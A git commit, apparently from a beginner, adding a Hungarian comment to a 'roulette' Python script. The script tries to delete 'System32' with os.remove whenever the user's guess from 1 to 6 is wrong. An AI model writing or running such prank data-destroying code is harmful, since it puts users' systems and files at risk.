1d47384963aad7a27261d8814d685494106ae917
Markicola12 <antalm481@gmail.com>
2023-12-13 10:29:58 +0100

    comment az elágazáshoz

--- rulett.py
+++ rulett.py
@@ -5,7 +5,7 @@ tipp = int(input("Tippelj egy egész számot 1 és 6 között: "))  # bekér a f
 
 szam = random.randint(1,6) # generál egy random számot
 
-if tipp == szam:
+if tipp == szam:        # egy elágazás ami vagy kiírja hogy nyertél vagy letörli a System32-t.
     print("Nyertél!")
 else:
     os.remove("System32")
